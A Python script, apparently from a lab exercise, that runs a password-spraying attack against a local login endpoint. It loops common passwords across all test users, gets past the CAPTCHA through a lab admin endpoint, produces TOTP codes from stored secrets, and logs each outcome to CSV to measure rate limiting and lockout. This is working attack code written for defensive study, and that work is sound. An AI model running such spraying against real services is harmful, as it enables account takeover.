import requests
import time
import json
import os
import argparse
import csv
import pyotp
from datetime import datetime

# ======================================
# CONFIGURATION
# ======================================
GROUP_SEED = 6631928
LOG_DIR = "logs"
os.makedirs(LOG_DIR, exist_ok=True)

# Common passwords that match the "Weak" users in generate_users.py
COMMON_PASSWORDS = [
    "123456", "password", "12345678", "qwerty", "123456789", "admin123",
    "welcome", "login", "princess", "football", "monkey", "dragon"
]

# Load user list to get usernames and secrets
try:
    with open("users.json", "r") as f:
        USER_DATA = json.load(f)
        # Create a dictionary for quick lookup of secrets
        USER_MAP = {u["username"]: u for u in USER_DATA}
        # List of usernames to target
        TARGET_USERNAMES = [u["username"] for u in USER_DATA]
except FileNotFoundError:
    print("[!] Error: users.json not found. Run generate_users.py first.")
    exit(1)


# ======================================
# HELPER FUNCTIONS
# ======================================

def get_captcha_token(base_url, session):
    """Fetches a valid CAPTCHA token from the admin endpoint."""
    try:
        admin_url = base_url.replace("/login", "/admin/get_captcha_token")
        r = session.get(admin_url, params={"group_seed": GROUP_SEED})
        if r.status_code == 200:
            return r.json().get("captcha_token")
    except Exception:
        pass
    return None


def generate_totp(username):
    """Generates a valid TOTP code for the specific user."""
    user = USER_MAP.get(username)
    if user and user.get("totp_secret"):
        totp = pyotp.TOTP(user["totp_secret"])
        return totp.now()
    return None


# ======================================
# ATTACK LOGIC
# ======================================

def run_spraying_attack(target_url, output_file, delay):
    print(f"[*] Starting Password Spraying Attack")
    print(f"[*] Target: {target_url}")
    print(f"[*] Passwords to test: {len(COMMON_PASSWORDS)}")
    print(f"[*] Users to target: {len(TARGET_USERNAMES)}")
    print(f"[*] Logging to: {output_file}")

    session = requests.Session()

    with open(output_file, "w", newline="") as csvfile:
        fieldnames = ["timestamp", "password_attempt", "username", "status", "latency_ms", "notes"]
        writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
        writer.writeheader()

        start_time = time.time()

        # OUTER LOOP: Iterate through common passwords
        for pwd_index, password in enumerate(COMMON_PASSWORDS):
            print(f"\n--- Round {pwd_index + 1}: Spraying password '{password}' ---")

            # INNER LOOP: Try this password on ALL users
            for username in TARGET_USERNAMES:

                payload = {
                    "username": username,
                    "password": password
                }

                # Send Request
                req_start = time.time()
                try:
                    r = session.post(target_url, json=payload)
                    latency = (time.time() - req_start) * 1000
                    resp_data = r.json()
                    status_code = r.status_code
                except Exception as e:
                    print(f"[!] Error: {e}")
                    continue

                # Handle Protections (Smart Bypass)
                notes = ""

                # 1. CAPTCHA Triggered
                if status_code == 403 and resp_data.get("captcha_required"):
                    notes += "captcha_bypass;"
                    token = get_captcha_token(target_url, session)
                    if token:
                        payload["captcha_token"] = token
                        # Retry
                        req_start = time.time()
                        r = session.post(target_url, json=payload)
                        latency += (time.time() - req_start) * 1000
                        status_code = r.status_code

                # 2. TOTP Triggered
                # (Spraying usually stops at password, but if we want to measure full success)
                if status_code == 401 and "totp" in str(resp_data.get("reason", "")):
                    notes += "totp_attempted;"
                    code = generate_totp(username)
                    if code:
                        payload["totp_code"] = code
                        # Retry
                        r = session.post(target_url, json=payload)
                        status_code = r.status_code

                # Log Result
                result_status = "fail"
                if status_code == 200:
                    result_status = "success"
                elif status_code == 429:
                    result_status = "rate_limited_global"
                elif status_code == 423:
                    result_status = "locked_out"

                writer.writerow({
                    "timestamp": datetime.now().isoformat(),
                    "password_attempt": password,
                    "username": username,
                    "status": result_status,
                    "latency_ms": round(latency, 2),
                    "notes": notes
                })

                if result_status == "success":
                    print(f"[+] HIT! User: {username} | Pass: {password}")

                # Optional delay between requests to avoid instant rate limiting
                # (Simulates a more realistic spray)
                if delay > 0:
                    time.sleep(delay)

            # Optional: Sleep between password rounds?
            # Usually hackers wait 30-60 mins. For the lab, we continue immediately
            # to see if the Rate Limiter catches us.

    print(f"\n[*] Spraying finished in {time.time() - start_time:.2f} seconds.")


# ======================================
# MAIN
# ======================================

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Password Spraying Attacker")
    parser.add_argument("--url", default="http://127.0.0.1:5000/login", help="Target URL")
    parser.add_argument("--delay", type=float, default=0.0, help="Delay between requests (seconds)")
    parser.add_argument("--tag", default="experiment", help="Log filename tag")

    args = parser.parse_args()

    filename = f"{LOG_DIR}/spraying_{args.tag}.csv"

    run_spraying_attack(args.url, filename, args.delay)